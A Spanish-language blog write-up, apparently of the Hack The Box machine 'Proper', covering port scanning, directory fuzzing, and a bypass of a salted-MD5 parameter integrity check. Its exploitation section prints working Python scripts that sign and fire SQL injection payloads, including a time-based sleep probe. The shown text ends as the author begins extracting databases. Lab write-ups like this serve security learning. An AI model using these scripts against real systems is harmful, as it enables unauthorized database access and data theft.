&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Que las luces fluyan.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Descubrimos puertos abiertos con &lt;strong&gt;nmap&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Investigamos el servidor web sobre el puerto 80&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n: jugamos con los par√°metros de la web&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#web-avoid-tampering&quot;&gt;Entendiendo como viajan las peticiones para evitar el error al modificar alguna variable&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-sqli-time&quot;&gt;Encontramos &lt;strong&gt;inyecci√≥n SQL time-based&lt;/strong&gt; jugando con la web&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#licenses-web-part&quot;&gt;Validamos credenciales encontradas con la &lt;strong&gt;inyecci√≥n SQL&lt;/strong&gt; contra un panel login&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-rfi&quot;&gt;Estudiamos posible &lt;strong&gt;Remote File Inclusion&lt;/strong&gt; en la web&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#testing-securefunc&quot;&gt;Confirmando &lt;strong&gt;Remote File Inclusion&lt;/strong&gt; en apartado web&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-racecondition&quot;&gt;Intentamos &lt;strong&gt;Race Condition&lt;/strong&gt; para sobreescribir archivo con c√≥digo &lt;strong&gt;PHP&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#cleanup-analysis&quot;&gt;Hacemos an√°lisis din√°mico contra los binarios del proceso &lt;strong&gt;Cleanup&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cleanup-pipe&quot;&gt;Interactuamos con el &lt;strong&gt;pipe&lt;/strong&gt; que usa el servicio &lt;strong&gt;Cleanup&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cleanup-ioninja&quot;&gt;Usando &lt;strong&gt;IO Ninja&lt;/strong&gt; para ver procesos del &lt;strong&gt;pipe&lt;/strong&gt; (gracias &lt;strong&gt;4st1nus&lt;/strong&gt;)&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cleanup-readfiles&quot;&gt;Viendo el contenido de cualquier archivo del sistema&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Inicialmente haremos un escaneo de puertos para saber que servicios est√°n ejecut√°ndose:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p- --open -v 10.10.10.231 -oG initScan 
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat initScan 
# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.231
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.231 ()   Status: Up
Host: 10.10.10.231 ()   Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 225.78 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, curiosamente solo tenemos el puerto 80 abierto‚Ä¶&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Servidor web.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Hagamos el escaneo basado en script y versiones, en este caso en el puerto 80 simplemente:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p 80 -sC -sV 10.10.10.231 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat portScan 
# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.231
Nmap scan report for 10.10.10.231
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: OS Tidy Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.45 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Empecemos a escarbar el servicio‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80.png&quot; alt=&quot;321page80&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Encontramos una bienvenida de varias im√°genes y algo de data, pero nada interesante.&lt;/p&gt;

&lt;p&gt;Revisando el c√≥digo fuente, tenemos una referencia a una URL y una petici√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;...
&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
    $(document).ready(function(){
        'use strict';
        jQuery('#headerwrap').backstretch([ &quot;assets/img/bg/bg1.jpg&quot;, &quot;assets/img/bg/bg3.jpg&quot; ], {duration: 8000, fade: 500});
        $( &quot;#product-content&quot; ).load(&quot;/products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;,function() {});
    });
&amp;lt;/script&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo emplea para armar un apartado de la bienvenida: (tiene un aspecto a que podemos jugar con inyecciones, pero primero veamos lo que renderiza con la URL)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_products.png&quot; alt=&quot;321page80_products&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interceptando la petici√≥n con &lt;code&gt;Burp&lt;/code&gt; e intentando modificar alguno de los par√°metros, tenemos:&lt;/p&gt;

&lt;p&gt;(&lt;em&gt;Agregue &lt;code&gt;proper.htb&lt;/code&gt; al &lt;code&gt;/etc/hosts&lt;/code&gt; para que resuelva contra la IP, por si alguno se pierde al ver el dominio ah√≠&lt;/em&gt;.)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_original.png&quot; alt=&quot;321burp_productsPHP_original&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Modificada:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_modErr.png&quot; alt=&quot;321burp_productsPHP_modErr&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Jmmm, nos detecta que hemos intentado modificar la petici√≥n y nos salta una advertencia. Salta siempre el mismo error si intentamos modificar cualquier variable‚Ä¶&lt;/p&gt;

&lt;p&gt;Siento que por ac√° deben ser los tiros pero por el momento no s√© que intentar‚Ä¶ Hagamos un escaneo de rutas a ver si encontramos algo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.10.231/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================
000000084:   301        1 L      10 W       150 Ch      &quot;assets&quot; 
000000765:   301        1 L      10 W       150 Ch      &quot;Assets&quot;
000004182:   301        1 L      10 W       152 Ch      &quot;licenses&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si validamos las rutas en la web, obtenemos info en &lt;code&gt;/licenses&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses.png&quot; alt=&quot;321page80_licenses&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un panel login, debemos logearnos con una direcci√≥n de correo (que podemos intuir que sea &lt;code&gt;usuario@proper.htb&lt;/code&gt;). Pero probando cositas no logramos nada‚Ä¶&lt;/p&gt;

&lt;p&gt;Haciendo un fuzz sobre &lt;code&gt;/assets&lt;/code&gt; encontramos la ruta &lt;code&gt;/api&lt;/code&gt;, pero no tenemos acceso a su contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ wfuzz --hc=404,500 -L -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://10.10.10.231/assets/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000009:   403        29 L     92 W       1233 Ch     &quot;js&quot;
000000015:   403        29 L     92 W       1233 Ch     &quot;css&quot;
000000045:   403        29 L     92 W       1233 Ch     &quot;img&quot;
000000078:   403        29 L     92 W       1233 Ch     &quot;api&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Jmmm, tenemos un login panel y un archivo que hace consultas para extraer productos‚Ä¶ Podemos pensar que debemos hacer alg√∫n tipo de &lt;code&gt;SQ, pero primero debemos bypassear el &lt;/code&gt;WAF (Firewall Web)&lt;code&gt; que nos detecta si cambiamos la consulta, despu√©s de un rato jugando con &lt;/code&gt;BurpSuite` vemos un error interesante al quitar uno de los par√°metros:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_products_without_h_parm.png&quot; alt=&quot;321burp_products_without_h_parm&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Vemos la ruta donde est√°n servidos los archivos del sitio: &lt;code&gt;C:\inetpub\wwwroot\&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Tenemos un &lt;code&gt;salt&lt;/code&gt; (&lt;strong&gt;conjunto de bits aleatorios que se le agregan a un hash, sea al principio o al final&lt;/strong&gt;, no lo sabemos) &lt;a href=&quot;https://thalskarthmaelstrom.wordpress.com/2014/03/15/hash-salt-y-hashes-lentos/&quot;&gt;&lt;strong&gt;INFO Salt&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Vemos dos archivos que pueden ser interesantes en alg√∫n caso, por si encontramos alg√∫n &lt;strong&gt;LFI&lt;/strong&gt; ya sabemos como se llama el archivo de configuraci√≥n de la base de datos‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Despu√©s de muchas pruebas ):) y estar super perdido, jugamos con el &lt;strong&gt;salt&lt;/strong&gt; y un fuzzeito guapet√≥n de payloads, pero antes de jugar, veamos el formato necesario para evitar el error &lt;strong&gt;‚ÄúForbidden - Tampering attempt detected‚Äù&lt;/strong&gt; al modificar las variables:&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;web-avoid-tampering&quot;&gt;Evitando error &lt;u&gt;Tampering attempt detected&lt;/u&gt; &lt;a href=&quot;#web-avoid-tampering&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta es la petici√≥n original:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.231/products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a entender como esta gener√°ndose el hash y revisamos como viaja la data.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://nitratine.net/blog/post/how-to-hash-passwords-in-python/&quot;&gt;How to hash passwords in Python&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.vitoshacademy.com/hashing-passwords-in-python/&quot;&gt;Hashing passwords in Python&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 
&amp;gt;&amp;gt;&amp;gt; import requests
&amp;gt;&amp;gt;&amp;gt; import hashlib
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; url = &quot;http://proper.htb/products-ajax.php&quot;
&amp;gt;&amp;gt;&amp;gt; salt = &quot;hie0shah6ooNoim&quot;
# En la consulta sale con un &quot;+&quot;, pero es debido al URL encode que se hace en la peticion (el + es un espacio ah√≠)
&amp;gt;&amp;gt;&amp;gt; payload = &quot;id desc&quot; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, tenemos las variables necesarias para empezar a jugar, el valor de &lt;code&gt;h&lt;/code&gt; podemos intuir que es el resultado del payload pero obteniendo su hash en &lt;code&gt;md5&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;&amp;gt;&amp;gt;&amp;gt; hashh = hashlib.md5(payload.encode('utf-8')).hexdigest()
&amp;gt;&amp;gt;&amp;gt; print(&quot;Payload: &quot; + payload + &quot; --&amp;gt; &quot; + &quot;Hash: &quot; + hashh)
Payload: id desc --&amp;gt; Hash: aa5a97b10a6dd87160868d2316ab2425
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, obtenemos el hash &lt;strong&gt;md5&lt;/strong&gt; de la cadena &lt;code&gt;id desc&lt;/code&gt;, pero no es el mismo que el de la consulta original, por lo tanto si hacemos una validaci√≥n ante la web, vemos el error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt;&amp;gt;&amp;gt; session = requests.Session()
&amp;gt;&amp;gt;&amp;gt; r = session.get(url, params={&quot;order&quot;:payload, &quot;h&quot;:hashh})
&amp;gt;&amp;gt;&amp;gt; print(r.text)
Forbidden - Tampering attempt detected.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ac√° entra en juego la variable &lt;code&gt;salt&lt;/code&gt;, mov√°mosla por todos lados a ver en que momento (si es que llega ese momento) nos deja de mostrar el error en la respuesta:&lt;/p&gt;

&lt;p&gt;üï¥Ô∏è Despu√©s de un rato‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt;&amp;gt;&amp;gt; hashh = hashlib.md5(payload.encode('utf-8') + salt.encode('utf-8')).hexdigest()
&amp;gt;&amp;gt;&amp;gt; print(&quot;Payload + Salt: &quot; + payload + &quot; + &quot; + salt + &quot; --&amp;gt; &quot; + &quot;Hash: &quot; + hashh)
Payload + Salt: id desc + hie0shah6ooNoim --&amp;gt; Hash: 453d803378d6fb7eaf6a3cab618106d6
&amp;gt;&amp;gt;&amp;gt; r = session.get(url, params={&quot;order&quot;:payload, &quot;h&quot;:hashh})
&amp;gt;&amp;gt;&amp;gt; print(r.text)
Forbidden - Tampering attempt detected.
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt;&amp;gt;&amp;gt; hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
&amp;gt;&amp;gt;&amp;gt; print(&quot;Salt + Payload: &quot; + salt + &quot; + &quot; + payload + &quot; --&amp;gt; &quot; + &quot;Hash: &quot; + hashh)
Salt + Payload: hie0shah6ooNoim + id desc --&amp;gt; Hash: a1b30d31d344a5a4e41e8496ccbdd26b
&amp;gt;&amp;gt;&amp;gt; r = session.get(url, params={&quot;order&quot;:payload, &quot;h&quot;:hashh})
&amp;gt;&amp;gt;&amp;gt; print(r.text)
&amp;lt;div class=&quot;row&quot;&amp;gt;&amp;lt;div class=&quot;col-md-4&quot;&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OJOOOOOOOOOOOOOo, &lt;strong&gt;en el hash vemos el mismo valor que en la consulta original&lt;/strong&gt; y al ver la respuesta de la petici√≥n tenemos la cabecera &lt;code&gt;HTML&lt;/code&gt; de la web (: As√≠ que ya sabemos como se genera el hash y como viaja la data para no obtener el errooooooooooooooooooooor üåª&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_yeahminion.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 60%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;web-sqli-time&quot;&gt;Encontramos &lt;u&gt;SQLi time-based&lt;/u&gt; en la web &lt;a href=&quot;#web-sqli-time&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Creemos el script para leer de un archivo llamado &lt;code&gt;sqlIgeneric.txt&lt;/code&gt; algunos payloads (de &lt;a href=&quot;https://github.com/payloadbox/sql-injection-payload-list&quot;&gt;esta lista&lt;/a&gt;), enviarlos a la web y ver que pasa :P&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;#!/usr/bin/python3

import requests, hashlib
import signal
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print(&quot;\nInterrupci√≥n, saliendo...\n&quot;)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables
url = &quot;http://proper.htb/products-ajax.php&quot;
salt = &quot;hie0shah6ooNoim&quot;
file_sqli = open('./sqlIgeneric.txt', 'r')
sqli_payloads = []

p1 = log.progress(&quot;paYl0Ad&quot;)

for pos, line_sqli in enumerate(file_sqli): # Recorremos el archivo
    payload = line_sqli.strip()
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    p1.status(payload)
    data_get = {&quot;order&quot;:payload, &quot;h&quot;:hashh}

    # Si se demora 3 segundos respondiendonos potencialmente existe una inyecci√≥n sql basada en tiempo.
    try:
        r = requests.get(url, params=data_get, timeout=3)

        # O si no hay error en la web tambien puede ser interesante.
        if r.status_code != 500: 
            sqli_payloads.append(payload)

    except requests.exceptions.Timeout:
        sqli_payloads.append(payload)

p1.success(&quot;FINAAAAAAAAAAAAAAAAAL.&quot;)

if sqli_payloads:
    print(&quot;[+] Estos payloads generaron algo distinto en la respuesta de la web.&quot;)
    total_payloads = '\n'.join(sqli_payloads) # Tomamos cada valor del array y lo imprimimos en una nueva linea.
    print(total_payloads)
else:
    print(&quot;[-] Nada a√∫n...&quot;)

file_sqli.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos si la p√°gina nos devuelve un c√≥digo distinto a &lt;strong&gt;Internal Error&lt;/strong&gt; (500) y si alg√∫n payload (de los que est√°n basados en tiempo) hace que la petici√≥n se demore.&lt;/p&gt;

&lt;p&gt;El diccionario es una colecci√≥n de varios repos, logramos extraer m√°s de 2000 payloads (l√≠neas):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/payloadbox/sql-injection-payload-list&quot;&gt;https://github.com/payloadbox/sql-injection-payload-list&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OWASP/AppSec-Browser-Bundle/tree/master/utilities/wfuzz/wordlist/fuzzdb/attack-payloads/sql-injection/payloads-sql-blind&quot;&gt;https://github.com/OWASP/payloads-sql-blind&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ejecut√°ndolo vemos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_fuzzSQLi_payloadsFound.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OPAAA, hay varios payloads que en su interacci√≥n generaron algo distinto a lo normal. PEEEEEEEEEEEERO ¬øqu√© es lo llamativo? ¬ølo sabes ya? EXACTOOOOOOO!! Todas tienen que ver con una inyecci√≥n &lt;strong&gt;SQL&lt;/strong&gt; basada en tiempooooooooooooooo.&lt;/p&gt;

&lt;p&gt;üßø &lt;strong&gt;&lt;em&gt;Una inyecci√≥n SQL basada en tiempo b√°sicamente es ejecutar alguna sentencia que al dar resultado (exitoso) genera un -delay- en el lado del servidor. Si ese -delay- existe (causado por nosotros) sabemos que existe un &lt;code&gt;SQLi time-based&lt;/code&gt;.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Para confirmar que tenemos ese tipo de inyecci√≥n podemos hacer esto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;...
for i in range(1,11):
    payload = f&quot;IF(6={i},sleep(5),0)#&quot;
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    data_get = {&quot;order&quot;:payload, &quot;h&quot;:hashh}

    try:
        r = requests.get(url, params=data_get, timeout=3)
        print(&quot;Nada: &quot; + payload)
    except requests.exceptions.Timeout:
        print(&quot;-------&amp;gt; Ac√°: &quot; + payload)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le pasamos el payload &lt;code&gt;IF(6=N,sleep(5),0)#&lt;/code&gt; (este es v√°lido en &lt;code&gt;MySQL&lt;/code&gt;, en caso de no servir deber√≠amos probar lo mismo pero con la sintaxis de los otros gestores de DBs) que le indica:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Si &lt;code&gt;N&lt;/code&gt; numero es igual a &lt;code&gt;6&lt;/code&gt;, haz que la web &lt;strong&gt;&lt;em&gt;se demore 5 segundos en responder&lt;/em&gt;&lt;/strong&gt;, de lo contrario sigue‚Ä¶ Si existe el delay en la respuesta, confirmamos la inyecci√≥n.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y si lo probamos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_confirmSQli_TIMEBASED.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LIIIIIIIIIIIISTOOOOOOOOONES, tenemos &lt;code&gt;SQLi time-based&lt;/code&gt; (y sabemos que estamos ante un &lt;code&gt;MySQL&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Pues explot√©moslo y veamos toooooooooda la info de las bases de datos (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;web-sqli-dbs&quot;&gt;Extraemos las bases de datos existentes &lt;a href=&quot;#web-sqli-dbs&quot;&gt;ü™ì&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/dbs.py&quot;&gt;dbs.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_dbs.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecut√°ndolo vemos solo 3 bases de datos y dos llamativas, &lt;code&gt;cleaner&lt;/code&gt; y &lt;code&gt;test&lt;/code&gt;, veamos las tablas de &lt;code&gt;cleaner&lt;/code&gt;‚Ä¶&lt;/p&gt;

